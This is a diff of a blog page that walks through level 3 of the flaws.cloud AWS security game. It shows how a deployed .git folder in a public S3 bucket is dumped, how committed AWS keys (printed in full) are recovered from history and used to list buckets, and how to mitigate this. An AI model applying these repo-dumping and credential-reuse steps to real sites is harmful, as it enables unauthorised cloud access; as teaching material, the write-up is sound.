@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html lang="en-US">
   <head>
-    <meta name="generator" content="Hugo 0.56.3" />
+    <meta name="generator" content="Hugo 0.64.1" />
     <meta charset="utf-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>flaws.cloud - Level 3 | text/plain</title>
@@ -30,8 +30,7 @@ IAM credentials in the commit history. Using them we can list the buckets and
 find the link to the next level." />
 <meta property="og:type" content="article" />
 <meta property="og:url" content="https://dominicbreuker.com/post/flaws_cloud_3/" />
-
-<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322" />
+<meta property="og:image" content="https://source.unsplash.com/category/technology/2000x1322"/>
 <meta property="article:published_time" content="2019-10-27T00:00:00+02:00" />
 <meta property="article:modified_time" content="2019-10-27T00:00:00+02:00" />
 
@@ -235,16 +234,14 @@ configurations. Now I took it up again and here is a walkthrough of level 3.
 Like before we have a public homepage hosted on S3. This time we find a git repository with
 IAM credentials in the commit history. Using them we can list the buckets and
 find the link to the next level.">
-
-
 <meta itemprop="datePublished" content="2019-10-27T00:00:00&#43;02:00" />
 <meta itemprop="dateModified" content="2019-10-27T00:00:00&#43;02:00" />
 <meta itemprop="wordCount" content="1868">
+<meta itemprop="image" content="https://source.unsplash.com/category/technology/2000x1322"/>
 
 
 
 <meta itemprop="keywords" content="infosec,cloud,AWS," />
-
     <script async src="/js/baffle.js"></script>
     <header>
       <h1 class="baffle" itemprop="headline">flaws.cloud - Level 3</h1>
@@ -275,16 +272,11 @@ find the link to the next level.</blockquote>
   <details>
     <summary>Table of Contents</summary>
     <nav id="TableOfContents">
-<ul>
-<li><a href="#level-3">Level 3</a></li>
-<li><a href="#the-flaw">The flaw</a>
-<ul>
-<li><a href="#prevent-bucket-listing">Prevent bucket listing</a></li>
-<li><a href="#keep-secrets-out-of-version-control">Keep secrets out of version control</a></li>
-<li><a href="#don-t-deploy-git-repositories">Don&rsquo;t deploy Git repositories</a></li>
-</ul></li>
-<li><a href="#conclusion">Conclusion</a></li>
-</ul>
+  <ul>
+    <li><a href="#prevent-bucket-listing">Prevent bucket listing</a></li>
+    <li><a href="#keep-secrets-out-of-version-control">Keep secrets out of version control</a></li>
+    <li><a href="#dont-deploy-git-repositories">Don&rsquo;t deploy Git repositories</a></li>
+  </ul>
 </nav>
   </details>
   <script>
@@ -304,25 +296,19 @@ find the link to the next level.</blockquote>
 
 
     <div itemprop="articleBody">
-      
-
-<p>The previous level 2 illustrated how ACL misconfiguration can accidentally open
+      <p>The previous level 2 illustrated how ACL misconfiguration can accidentally open
 up S3 buckets to all AWS users anywhere on the world. This was enough to just
 get the secret we needed. This time it will not be that easy anymore.
 Again, the starting point is a <a href="http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/">public website</a>
 and we can again just list the bucket. But now the secret is hidden.</p>
-
 <p>EDIT 11th Nov 2019: changed the description of this level. I mistakenly assumed
 you would need an IAM user with access to S3 but you do not.
 Everything can be done without authentication. This means you do not need your
 own AWS account for this level.</p>
-
 <h1 id="level-3">Level 3</h1>
-
 <p>The description of this level says it is fairly similar to the previous one.
 Thus, we just try again to list the bucket with our dummy user and see what we
 get. The following call will do the trick:</p>
-
 <pre><code> $ aws s3api list-objects-v2 --bucket level3-9afd3927f195e10225021a578e6f78df.flaws.cloud --no-sign-request --region us-west-2
 {
     &quot;Contents&quot;: [
@@ -357,28 +343,21 @@ get. The following call will do the trick:</p>
         }
     ]
 }
-</code></pre>
-
-<p>Great, it works on this bucket too. We find the usual index.html containing this
+</code></pre><p>Great, it works on this bucket too. We find the usual index.html containing this
 levels homepage, a robots.txt file and then a lot of other files. Some of them
 have a key starting with <code>.git</code>, which suggests that they belong to a git
 repository. It looks as if the creator of the homepage did not just deploy the
 homepage itself, but also the git repository used to develop it.</p>
-
 <p>To explore the repository further, we have to download all the files. A quick
 way to do that is to use the <code>sync</code> command of the AWS CLI tool. The following
 command will download the entire bucket to your current local directory:</p>
-
 <pre><code> $ aws s3 sync s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud . --no-sign-request --region us-west-2
 download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/HEAD to .git/HEAD
 download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/hooks/commit-msg.sample to .git/hooks/commit-msg.sample
 download: s3://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/COMMIT_EDITMSG to .git/COMMIT_EDITMSG
 ...
-</code></pre>
-
-<p>The git repository is now available and you can work with it just like any
+</code></pre><p>The git repository is now available and you can work with it just like any
 developer would. First start by inspecting the files you can see:</p>
-
 <pre><code> $ ls -la
 total 160
 drwxr-xr-x 3 root root   4096 Oct 24 13:48 .
@@ -391,13 +370,10 @@ drwxr-xr-x 6 root root   4096 Oct 24 13:48 .git
 -rw-r--r-- 1 root root   1035 Oct 24 13:48 hint4.html
 -rw-r--r-- 1 root root   1703 Oct 24 13:48 index.html
 -rw-r--r-- 1 root root     26 Oct 24 13:48 robots.txt
-</code></pre>
-
-<p>Not much to see apart from the main homepage and a few hints (that we do not
+</code></pre><p>Not much to see apart from the main homepage and a few hints (that we do not
 look at, of course). But what did this homepage look like in the past? We can
 find out by exploring the development history with git. Use the git <a href="https://git-scm.com/">command
 line tool</a> to see the history of the latest commits:</p>
-
 <pre><code> $ git log
 commit b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 (HEAD -&gt; master)
 Author: 0xdabbad00 &lt;scott@summitroute.com&gt;
@@ -410,13 +386,10 @@ Author: 0xdabbad00 &lt;scott@summitroute.com&gt;
 Date:   Sun Sep 17 09:10:07 2017 -0600
 
     first commit
-</code></pre>
-
-<p>This is a very short history. There are only two commits. Thus, it is easy to
+</code></pre><p>This is a very short history. There are only two commits. Thus, it is easy to
 spot the very interesting commit message of the 2nd commit. Sounds like there
 is something the creator of the homepage does not want others to see. We can
 compare this commit to the previous one to see what that is:</p>
-
 <pre><code> $ git diff f52ec03b227ea6094b04e43f475fb0126edb5a61 b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526
 diff --git a/access_keys.txt b/access_keys.txt
 deleted file mode 100644
@@ -426,21 +399,15 @@ index e3ae6dd..0000000
 @@ -1,2 +0,0 @@
 -access_key AKIAJ367LIFB4IJST7QA
 -secret_access_key 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
-</code></pre>
-
-<p>Ooops, looks like the creator accidentally committed some AWS credentials to
+</code></pre><p>Ooops, looks like the creator accidentally committed some AWS credentials to
 the repository. A few seconds later, the mistake was spotted and fixed quickly
 by adding a commit to remove them. Unfortunately, git does not forget and
 nothing is ever deleted. What might happen if we exchange our dummy user
 credentials with these and try some requests? First set credentials:</p>
-
 <pre><code> $ export AWS_ACCESS_KEY_ID=AKIAJ367LIFB4IJST7QA
  $ export AWS_SECRET_ACCESS_KEY=OdNa7m+bqUvF3Bn/qgSnPE1eBpqcBWTjqwV83Lys
-</code></pre>
-
-<p>The level description mentions we may be able to list other buckets, so lets
+</code></pre><p>The level description mentions we may be able to list other buckets, so lets
 do that first:</p>
-
 <pre><code> $ aws s3api list-buckets
 {
     &quot;Buckets&quot;: [
@@ -490,20 +457,15 @@ do that first:</p>
         &quot;ID&quot;: &quot;d70419f1cb589d826b5c2b8492082d193bca52b1e6a81082c36c993f367a5d73&quot;
     }
 }
-</code></pre>
-
-<p>Great! We can now see all the buckets for levels 1 to 6. We can go to the next
+</code></pre><p>Great! We can now see all the buckets for levels 1 to 6. We can go to the next
 level by checking out the website for the <a href="level4-1156739cfb264ced6de514971a4bef68.flaws.cloud">4th level</a>.
 Clever people may also think they can now jump to levels 5 and 6 directly.
 But those pages tell you to not cheat and the actual page is hosted in a
 subdirectory you can&rsquo;t see right now.</p>
-
 <h1 id="the-flaw">The flaw</h1>
-
 <p>In this level, we found an initial foothold on the account under attack. We
 found credentials for one if the IAM users and can now perform all actions it
 is authorized to do.</p>
-
 <p>Multiple issues lead to us being able to do that. Like in the previous level,
 we were able to use a configuration mistake to list the bucket without special
 access rights (other than those we gave ourselves). The next issue is that the
@@ -511,9 +473,7 @@ creator of the homepage pushed the git repository into the bucket hosting the
 page. In combination with careless handling of AWS credentials, attackers can
 now get valid credentials. What could have been done to mitigate the danger of
 that happening?</p>
-
 <h2 id="prevent-bucket-listing">Prevent bucket listing</h2>
-
 <p>By accidentally leaving the bucket open for everyone, we were enabled to list the
 bucket and discover the git repository. Clearly this misconfiguration is bad
 and should be avoided. In this case however we do not strictly need this
@@ -522,24 +482,19 @@ possible to request content via HTTP. S3 will serve all content in the bucket
 via HTTP, including the git repository. Thus, it is easy to test if a git
 repository is on a web server. In our case, the following curl command will
 reveal that there is a repository:</p>
-
 <pre><code> $ curl http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/HEAD
 ref: refs/heads/master
-</code></pre>
-
-<p>&rdquo;.git/HEAD&rdquo; is a file that all git repositories have. Thus you can always just
+</code></pre><p>&ldquo;.git/HEAD&rdquo; is a file that all git repositories have. Thus you can always just
 request this file. If you get a response you know there is a repository. There
 are several other standard file you could download. For a short introduction to
 file structure, refer to this <a href="https://medium.freecodecamp.org/understanding-git-for-real-by-exploring-the-git-directory-1e079c15b807">blog post</a>.
 The majority of content however is stored under &ldquo;.git/objects&rdquo; and file names
 are SHA-1 hashes of the objects stored in the repository (more on objects <a href="https://git-scm.com/book/en/v2/Git-Internals-Git-Objects">here</a>).
 Their location is not easily predictable.</p>
-
 <p>Under certain circumstances it can be possible to dump a git repository even if
 the web server does not allow listing files. <a href="https://github.com/internetwache/GitTools">GitTools</a>
 provides a script for this purpose. In our example we can use it to get the
 repository:</p>
-
 <pre><code> $ ./gitdumper.sh http://level3-9afd3927f195e10225021a578e6f78df.flaws.cloud/.git/ /tmp/repo
 ...
 [*] Destination folder does not exist
@@ -548,11 +503,8 @@ repository:</p>
 ...
 [+] Downloaded: objects/c2/aab7e03933a858d1765090928dca4013fe2526
 ...
-</code></pre>
-
-<p>Note that this does not require any IAM credentials at all.
+</code></pre><p>Note that this does not require any IAM credentials at all.
 Now we can the result like before to explore the git history and find the keys.</p>
-
 <pre><code> $ git diff b64c8dcfa8a39af06521cf4cb7cdce5f0ca9e526 f52ec03b227ea6094b04e43f475fb0126edb5a61
 diff --git a/access_keys.txt b/access_keys.txt
 new file mode 100644
@@ -562,9 +514,7 @@ index 0000000..e3ae6dd
 @@ -0,0 +1,2 @@
 +access_key AKIAJ367LIFB4IJST7QA
 +secret_access_key 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
-</code></pre>
-
-<p>A word of caution: be careful with git repositories you download from untrusted
+</code></pre><p>A word of caution: be careful with git repositories you download from untrusted
 sources. Always check out the &ldquo;.git/hooks&rdquo; folder. It contains the
 <a href="https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks">hooks</a>, which are
 shell scripts that developers like to run automatically on certain git commands
@@ -573,22 +523,18 @@ repository, you may accidentally trigger a malicious script.
 During normal git clones you <a href="https://git-scm.com/book/en/v2/Customizing-Git-Git-Hooks">do not get</a>
 such hooks but if you download all files from a website you will. Not long ago
 Git hooks caused <a href="https://blogs.msdn.microsoft.com/devops/2018/05/29/announcing-the-may-2018-git-security-vulnerability/">some trouble</a>.</p>
-
 <h2 id="keep-secrets-out-of-version-control">Keep secrets out of version control</h2>
-
 <p>If no secrets had been committed to the git repository we would not have gained
 access to the account. Obviously you should never commit them and if you do,
 you must consider the secret as revealed and rotate credentials. Deleting a
 secret from master does not delete if from the history of the version control
 system.</p>
-
 <p>Besides educating your team and checking for such problems in code reviews you
 can run automated scanners to find secrets. This is handy both for defenders
 (e.g., make it part of CI) and attackers (because real repositories are huge
 and manual search takes time). For example, you could use <a href="https://github.com/dxa4481/truffleHog">truffleHog</a>.
 To test drive it, just install with <code>pip install truffleHog</code>, then run it on the
 repository we dumped in this level and it finds the key for you:</p>
-
 <pre><code>truffleHog --regex --entropy=false /tmp/repo/
 ~~~~~~~~~~~~~~~~~~~~~
 Reason: AWS API Key
@@ -601,57 +547,48 @@ Commit: Oops, accidentally added something I shouldn't have
 AKIAJ367LIFB4IJST7QA
 ~~~~~~~~~~~~~~~~~~~~~
 ...
-</code></pre>
-
-<p>Fun fact: this problem does happen a lot even in public GitHub repositories. Try search
+</code></pre><p>Fun fact: this problem does happen a lot even in public GitHub repositories. Try search
 queries like &ldquo;DELETE ENV&rdquo; which are be characteristic for commit messages
 describing the &ldquo;fix&rdquo;. Or check out GitHub dorks repositories like <a href="https://github.com/techgaun/github-dorks">this one</a>.
 They contain scripts for GitHub scanning.</p>
-
-<h2 id="don-t-deploy-git-repositories">Don&rsquo;t deploy Git repositories</h2>
-
+<h2 id="dont-deploy-git-repositories">Don&rsquo;t deploy Git repositories</h2>
 <p>The most obvious fix is to just not deploy the Git repository. It is not needed
 to serve the website and should have never made it to the bucket in the first
 place. A scan of the <a href="https://www.alexa.com/topsites">Alexa</a> Top 1M conducted
 in 2015 (see <a href="https://www.internetwache.org/wie-ungeschutzte-git-repositorys-die-sicherheit-ihrer-webseite-gefahrden-eine-analyse-der-alexa-1m-28-07-2015/">here</a>,
 German only) found ~10k /1% websites where this mistake was made. Thus, it
 seems to actually happen quite a bit, albeit not frequently.</p>
-
 <p>To be on the safe side, you can block access to a git repository just in
 case it does get copied to an S3 bucket. For example, the bucket policy shown below
 would grant public read to the entire bucket with the first statement. It is
 required for public website access (<a href="https://docs.aws.amazon.com/AmazonS3/latest/dev/WebsiteAccessPermissionsReqd.html">AWS docs</a>).
 The second statement then overrides the first and denies access to the &ldquo;.git&rdquo; folder.
 Remember that Deny trumps Allow and is evaluated first.</p>
-<div class="highlight" style="background: #272822"><pre style="line-height: 125%"><code class="language-json" data-lang="json"><span></span><span style="color: #f8f8f2">{</span>
-  <span style="color: #f92672">&quot;Version&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;2012-10-17&quot;</span><span style="color: #f8f8f2">,</span>
-  <span style="color: #f92672">&quot;Statement&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #f8f8f2">[</span>
-    <span style="color: #f8f8f2">{</span>
-      <span style="color: #f92672">&quot;Sid&quot;</span><span style="color: #f8f8f2">:</span><span style="color: #e6db74">&quot;PublicRead&quot;</span><span style="color: #f8f8f2">,</span>
-      <span style="color: #f92672">&quot;Effect&quot;</span><span style="color: #f8f8f2">:</span><span style="color: #e6db74">&quot;Allow&quot;</span><span style="color: #f8f8f2">,</span>
-      <span style="color: #f92672">&quot;Principal&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;*&quot;</span><span style="color: #f8f8f2">,</span>
-      <span style="color: #f92672">&quot;Action&quot;</span><span style="color: #f8f8f2">:[</span><span style="color: #e6db74">&quot;s3:GetObject&quot;</span><span style="color: #f8f8f2">],</span>
-      <span style="color: #f92672">&quot;Resource&quot;</span><span style="color: #f8f8f2">:[</span><span style="color: #e6db74">&quot;arn:aws:s3:::your-bucket/*&quot;</span><span style="color: #f8f8f2">]</span>
-    <span style="color: #f8f8f2">},</span>
-    <span style="color: #f8f8f2">{</span>
-      <span style="color: #f92672">&quot;Sid&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;DenyGit&quot;</span><span style="color: #f8f8f2">,</span>
-      <span style="color: #f92672">&quot;Effect&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;Deny&quot;</span><span style="color: #f8f8f2">,</span>
-      <span style="color: #f92672">&quot;Principal&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;*&quot;</span><span style="color: #f8f8f2">,</span>
-      <span style="color: #f92672">&quot;Action&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;s3:GetObject&quot;</span><span style="color: #f8f8f2">,</span>
-      <span style="color: #f92672">&quot;Resource&quot;</span><span style="color: #f8f8f2">:</span> <span style="color: #e6db74">&quot;arn:aws:s3:::your-bucket/.git/*&quot;</span>
-    <span style="color: #f8f8f2">}</span>
-  <span style="color: #f8f8f2">]</span>
-<span style="color: #f8f8f2">}</span>
-</code></pre></div>
-
-<h1 id="conclusion">Conclusion</h1>
-
+<div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-json" data-lang="json">{
+  <span style="color:#f92672">&#34;Version&#34;</span>: <span style="color:#e6db74">&#34;2012-10-17&#34;</span>,
+  <span style="color:#f92672">&#34;Statement&#34;</span>: [
+    {
+      <span style="color:#f92672">&#34;Sid&#34;</span>:<span style="color:#e6db74">&#34;PublicRead&#34;</span>,
+      <span style="color:#f92672">&#34;Effect&#34;</span>:<span style="color:#e6db74">&#34;Allow&#34;</span>,
+      <span style="color:#f92672">&#34;Principal&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
+      <span style="color:#f92672">&#34;Action&#34;</span>:[<span style="color:#e6db74">&#34;s3:GetObject&#34;</span>],
+      <span style="color:#f92672">&#34;Resource&#34;</span>:[<span style="color:#e6db74">&#34;arn:aws:s3:::your-bucket/*&#34;</span>]
+    },
+    {
+      <span style="color:#f92672">&#34;Sid&#34;</span>: <span style="color:#e6db74">&#34;DenyGit&#34;</span>,
+      <span style="color:#f92672">&#34;Effect&#34;</span>: <span style="color:#e6db74">&#34;Deny&#34;</span>,
+      <span style="color:#f92672">&#34;Principal&#34;</span>: <span style="color:#e6db74">&#34;*&#34;</span>,
+      <span style="color:#f92672">&#34;Action&#34;</span>: <span style="color:#e6db74">&#34;s3:GetObject&#34;</span>,
+      <span style="color:#f92672">&#34;Resource&#34;</span>: <span style="color:#e6db74">&#34;arn:aws:s3:::your-bucket/.git/*&#34;</span>
+    }
+  ]
+}
+</code></pre></div><h1 id="conclusion">Conclusion</h1>
 <p>This level demonstrated that it is dangerous to commit secrets to Git
 repositories as well as to make these repositories available on the website.
 None of this is specific to the cloud or AWS in particular. Still, it is
 important to know how to configure S3 buckets correctly to avoid it. Key
 takeaways should be:</p>
-
 <ul>
 <li>never commit IAM credentials to Git repositories</li>
 <li>never deploy Git repositories on your website</li>
